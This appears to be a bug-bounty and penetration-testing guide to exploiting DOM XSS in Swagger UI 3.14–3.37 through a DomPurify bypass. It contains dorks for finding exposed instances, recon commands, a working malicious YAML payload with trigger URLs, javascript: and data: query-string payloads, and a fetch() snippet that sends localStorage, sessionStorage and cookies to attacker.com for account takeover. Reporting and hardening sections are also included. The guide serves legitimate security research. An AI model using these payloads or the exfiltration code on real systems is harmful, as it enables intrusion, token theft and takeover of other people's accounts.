```markdown
# Swagger UI Vulnerability Hunting – Full Guide 

End-to-end guide for discovering, exploiting, and reporting Swagger UI vulnerabilities in bug bounty and penetration testing. Focuses on DOM XSS in vulnerable Swagger UI 3.x versions (3.14.0–3.37.x), misconfigurations, and API abuse.[web:6][web:16][web:18]

---

## 0. Scope, Ethics, and Setup

### 0.1 Scope & Legal

- Test only domains and assets that are explicitly in scope for your bug bounty program or client engagement.[web:18]
- Treat dev/staging/admin Swagger UIs as **high value**, but confirm they are listed or clearly allowed in scope.[web:18]
- Never attack random third-party Swagger instances without permission.

### 0.2 Lab / Tooling Setup

Suggested stack:

- OS: Kali Linux (or any Linux with standard recon tools).
- Browser: Firefox/Chromium with dev tools.
- Tools:
  - `subfinder`, `httpx`, `gau`/`waybackurls`
  - `nuclei`
  - `Burp Suite` or `ZAP`
  - `swagger-ui-detector`[web:15]
  - `autoswagger`[web:22]

Basic HTTP server for payload hosting:

```
python3 -m http.server 80 --bind 0.0.0.0
```

---

## 1. Discovery Phase – Finding Swagger UI in the Wild

Goal: Generate a high-quality list of Swagger UI URLs and exposed API specs.

### 1.1 Google Dorks – Public Swagger UIs

```
# Generic Swagger UI
intext:"Swagger UI" intitle:"Swagger UI"
intext:"Swagger UI 3" intitle:"Swagger UI"
intext:"Try it out" "Swagger UI"

# Target-specific
intext:"Swagger UI" intitle:"Swagger UI" site:target.com
intext:"Swagger UI" "Authorize" site:target.com
intext:"Swagger UI" "JWT" OR "Bearer" site:target.com

# Common paths
inurl:swagger-ui.html "Swagger UI"
inurl:"/swagger-ui/index.html" "Swagger UI"
inurl:"/swagger-ui/" "Swagger UI"
inurl:"/docs" "Swagger UI"
inurl:"/api-docs" "Swagger UI"
```
These dorks help locate public Swagger UIs and have been used in real-world research to find dozens of exposed instances.[web:6][web:18]

API spec exposure:

```
# API spec files
inurl:openapi.json OR inurl:swagger.json
ext:json "swagger" "paths" "info"
ext:yaml "swagger" OR "openapi" "paths"
```
Direct specs usually contain all endpoints and parameter structures, often callable without authentication.[web:6][web:22]

### 1.2 GitHub Dorks – Version and Code Recon

Focus on `swagger-ui-dist` versions and how Swagger UI is embedded.

```
# Vulnerable swagger-ui-dist versions (3.14.x–3.37.x)
"swagger-ui-dist\": \"3.[1-3]" path:package.json
"swagger-ui-dist\": \"3.3" path:package.json
"swagger-ui-dist\": \"3.2" path:package.json
"swagger-ui-dist\": \"3.1" path:package.json

# Generic usage
"swagger-ui-dist" path:package.json
"SwaggerUIBundle(" path:*.js
"SwaggerUIStandalonePreset" path:*.js

# Docs & internal mentions
"Swagger UI" path:*.md
"swagger-ui" "internal" OR "staging" path:*.md

# Infra-related
"swagger-ui" path:Dockerfile
"swagger-ui" path:docker-compose.yml
"SWAGGER_UI" path:*.env
```
These help you identify which projects integrate Swagger UI and what versions they use.[web:6][web:21]

### 1.3 Shodan & Cloud Dorks – Infra Exposure

```
# Shodan
http.title:"Swagger UI"
"Swagger UI" "Try it out" port:443

# Common cloud/SaaS domains
site:*.azure.com "Swagger UI"
site:*.amazonaws.com "Swagger UI"
site:*.googleapis.com "Swagger UI"
site:*.atlassian.net "Swagger UI"
```
Research shows many dev/admin Swagger UIs accidentally exposed on cloud environments.[web:18]

---

## 2. Recon Automation – From Dorks to Target Lists

Goal: Convert recon into actionable lists for scanning and exploitation.

### 2.1 Subdomain + Path Enumeration

```
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. Common Swagger paths
cat << 'EOF' > paths.txt
/swagger-ui.html
/swagger-ui/index.html
/swagger-ui/
/docs
/api-docs
/v1/swagger.json
/v2/swagger.json
/openapi.json
/swagger.json
EOF

# 3. Check all subs + paths
httpx -l subs.txt -paths paths.txt -silent -o swagger-hits.txt
```
This quickly identifies live Swagger UIs and spec endpoints across all subdomains.[web:22]

### 2.2 Historical URL Mining with gau/wayback

```
gau target.com | grep -Ei "swagger-ui|swagger\.json|openapi\.json|/docs" | sort -u > swagger-candidates.txt
httpx -l swagger-candidates.txt -silent -o swagger-live.txt
```
Old URLs from Wayback or gau often still work in dev/staging, giving you more surfaces.[web:22]

### 2.3 Automated Tools: swagger-ui-detector & Autoswagger

```
# Swagger UI Detector
git clone https://github.com/ArcHound/swagger-ui-detector
cd swagger-ui-detector
python3 swagger-ui-detector.py --url-list ../swagger-hits.txt --one-line
```
Detects Swagger UI instances and attempts to infer versions.[web:15]

```
# Autoswagger
git clone https://github.com/intruder-io/autoswagger
cd autoswagger
python3 autoswagger.py -u https://target.com/swagger-ui.html -o specs.json
```
Extracts API specs from Swagger UI pages to help discover unauthenticated endpoints and weaknesses.[web:22]

---

## 3. Version Detection – Assessing Vulnerability

Goal: Determine whether Swagger UI is in a known vulnerable range.

### 3.1 Console Version Detection (Swagger UI 3.x)

Steps:

1. Open the Swagger UI (example: `https://target.com/swagger-ui.html`).
2. Press `F12` → open the **Console** tab.
3. Run:

   ```
   JSON.stringify(versions)
   ```

Sample output:

```
{"swaggerUi":{"version":"3.37.2"}}
```

If the version falls in `3.14.0–3.37.x`, it is in the range associated with DOM XSS via DomPurify 2.2.2.[web:5][web:16][web:21]

### 3.2 Visual Heuristics

| Version range  | Visual cues                                                 | Risk level         |
|----------------|-------------------------------------------------------------|--------------------|
| 3.14–3.37.x    | Modern 3.x UI, “Try it out”, heavy Markdown descriptions   | High (DOM XSS)     |
| 3.38+          | Similar UI, but patched DomPurify                          | Medium             |
| 4.x+           | Newer look, more recent bundles                            | Lower              |
| 2.x            | Classic older design, version text at bottom               | Informational      |

Helps prioritize quickly when version detection API is not obvious.[web:5][web:21][web:18]

---

## 4. Exploitation – DOM XSS via Malicious Specs

Goal: Turn vulnerable UI into a working XSS exploit.

### 4.1 Crafting and Hosting the Payload

Create `test.yaml` on your attacker server:

```
swagger: '2.0'
info:
  title: PoC
  description: |
    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title=\"</textarea><img src='#' onerror='alert(window.origin)'>\"
paths: {}
```

Host it:

```
python3 -m http.server 80 --bind 0.0.0.0
```

This payload leverages a DomPurify 2.2.2 bypass to execute arbitrary JavaScript when rendered as Markdown in Swagger UI.[web:6][web:16][web:18]

### 4.2 XSS Trigger URLs

In the target’s Swagger UI, try:

```
https://target/swagger-ui.html?url=http://your-server/test.yaml
https://target/swagger-ui.html?configUrl=http://your-server/test.yaml
```

If an alert box with `window.origin` appears, you have DOM XSS in the context of the target’s origin.[web:6][web:18]

### 4.3 Additional Query String Tests

Quick tests for weaker or custom vulnerabilities:

```
?url=javascript:alert(1)
?configUrl=data:text/html,<svg onload=alert(1)>
?url=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

Some custom deployments dangerously pass `url` or `configUrl` into sinks without sanitization, leading to HTML injection or XSS.[web:19]

---

## 5. Markdown Attack Surface

Swagger/OpenAPI fields commonly rendered as Markdown before HTML:

- `info.description`
- Operation `summary`
- Operation `description`
- `responses[*].description`
- `parameters[*].description`

### 5.1 Workflow for Markdown-Based XSS

1. **Get the spec**:
   - Directly download `openapi.json`/`swagger.json`, or  
   - Use `autoswagger` to extract it.[web:22]

2. **Edit** one of the Markdown fields, e.g.:

   ```
   description: |
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title=\"</textarea><img src='#' onerror='alert(document.domain)'>\"
   ```

3. **Host** the updated spec on your server.
4. Load it in the target Swagger UI with `?url=` or `?configUrl=`.
5. Observe whether the payload executes.

Researchers leveraged such Markdown fields combined with DomPurify bypasses to achieve reliable DOM XSS.[web:6][web:17][web:18]

---

## 6. Post-XSS Escalation – From XSS to Account Takeover

Once XSS is confirmed, focus on impact.

### 6.1 Inspect Browser Storage

Check storage in the victim context:

```
localStorage
sessionStorage
document.cookie
```

High-value targets:

- JWT `access_token`, `id_token`, `refresh_token`
- API keys or bearer tokens
- Session cookies
- CSRF tokens

Example exfiltration:

```
fetch('https://attacker.com/log?d=' + encodeURIComponent(
  JSON.stringify({
    ls: localStorage,
    ss: sessionStorage,
    c: document.cookie
  })
));
```

Real-world writeups have shown account takeover by stealing tokens stored in Swagger UI contexts (for example, Jamf-like flows).[web:6][web:18][web:19]

### 6.2 Abusing the API via Swagger UI

Use the same Swagger UI or an intercepting proxy:

1. Identify sensitive endpoints in the spec:
   - Admin-only operations.
   - User management, password reset, email update.
   - File uploads or execution endpoints.

2. Use stolen tokens or authenticated sessions to:
   - Change victim profile data.
   - Access other users’ resources (IDOR).
   - Perform high-impact operations.

Intercept sample requests using Burp, modify IDs or parameters, and test for improper access control.[web:6][web:22]

---

## 7. Broader API & Config Issues to Test

A Swagger UI exposure often correlates with other weaknesses.

### 7.1 Authentication & Authorization

- Sensitive endpoints missing security requirements in the spec.
- Operations marked as public but used by authenticated clients in production.
- Inconsistent auth across versions (e.g. `/v1/` vs `/v2/`).

### 7.2 Input Validation and Schema Alignment

- Spec says `integer`, API accepts non-integers.
- Missing validation (no `maximum`, `pattern`, `format`).
- Trust of client-side validation only.

These can lead to logic issues or even injection vulnerabilities downstream.[web:22]

### 7.3 Rate Limiting and Abuse

- Check repeated POST/PUT/DELETE requests.
- Look at endpoints for signup, password reset, sending emails, etc.
- Attempt to bypass rate limiting by using multiple endpoints or hosts.

### 7.4 Sensitive Data Exposure

- Secrets or internal hostnames in example fields.
- Debug endpoints documented but not meant for external exposure.

Use an API security checklist to systematically walk through these vectors.[web:22]

---

## 8. Reporting – Building a Strong Bug Bounty Submission

### 8.1 Recommended Report Structure

1. **Title**  
   `DOM XSS in Swagger UI via malicious OpenAPI spec leads to account takeover`.

2. **Summary**  
   Short, high-level explanation of:
   - Vulnerable Swagger UI version (from `JSON.stringify(versions)`).
   - Attack vector (`url`/`configUrl` / Markdown fields).
   - Demonstrated impact (token theft, ATO).[web:6][web:18]

3. **Technical Details**
   - Exact Swagger UI URL and version.
   - Payload used (`test.yaml` snippet).
   - How the payload is passed and rendered.

4. **Steps to Reproduce**
   1. Host malicious `test.yaml`.
   2. Open `https://target/swagger-ui.html?url=http://attacker/test.yaml`.
   3. Observe XSS.
   4. Capture token from localStorage/sessionStorage and show use for ATO.

5. **Impact**
   - Describe precisely what an attacker can do:
     - Access private data.
     - Control victim accounts.
     - Execute admin actions.

6. **Remediation**
   - Upgrade Swagger UI to patched version (3.38+ or 4.x).[web:16][web:21]
   - Restrict or disable arbitrary external `url`/`configUrl` inputs.
   - Harden CSP and sanitize Markdown content.

High-quality reports with clear PoCs and impact chains are more likely to receive higher severity and rewards.[web:16][web:18]

---

## 9. Defenses & Hardening Guidelines (Blue Team View)

### 9.1 Upgrade and Patch

- Update `swagger-ui-dist`:

  ```
  npm install swagger-ui-dist@^4.13.0
  ```

- Or use the latest official Swagger UI releases and images.[web:6][web:21]

Verify version:

```
JSON.stringify(versions.swaggerUi.version)
```

### 9.2 Limit Exposure

- Require authentication for Swagger UI, especially for admin/dev APIs.
- Use network controls (VPN/IP allowlist) for internal documentation.[web:18]
- Disable or lock down `url`/`configUrl` so they only load specs from trusted locations.

### 9.3 Content Security Policy & Sanitization

- Deploy strict CSP (avoid `unsafe-inline` where possible).
- Sanitize all user-controlled fields rendered as Markdown/HTML.
- Regularly review dependencies like DomPurify for security advisories.[web:17][web:18]

---

## 10. Practical Cheat Sheet – Fast Workflow

```
1. DISCOVERY
   - Google/GitHub/Shodan dorks → Swagger UI URLs and specs.

2. RECON
   - subfinder + httpx + gau → compile swagger-hits.txt.

3. VERSION
   - Open UI → JSON.stringify(versions) → check if 3.14–3.37.x.

4. EXPLOIT
   - Host DomPurify-bypass test.yaml.
   - Test ?url= and ?configUrl= parameters.

5. IMPACT
   - Dump localStorage/sessionStorage/document.cookie.
   - Abuse API endpoints to reach ATO/IDOR.

6. REPORT
   - Provide PoC URL, code snippet, video, and full impact chain.
```
This mirrors the methodology seen in public Swagger UI research, vendor advisories, and offensive conference talks.[web:6][web:18][web:19]

---

## References

- Vidoc Security: “Hacking Swagger-UI – from XSS to account takeovers”[web:6]  
- Tenable: “Swagger UI 3.14.0 < 3.38.0 Cross-Site Scripting”[web:16]  
- PortSwigger: “Widespread Swagger-UI library vulnerability leads to DOM XSS”[web:18]  
- Swagger UI version detection docs and source[web:5][web:21]  
- swagger-ui-detector – bulk version and presence detection[web:15]  
- Autoswagger – detecting API auth weaknesses and spec extraction[web:22]  
- XSS & DomPurify bypass research and videos on weaponizing Swagger UI XSS[web:17][web:19]

---

```
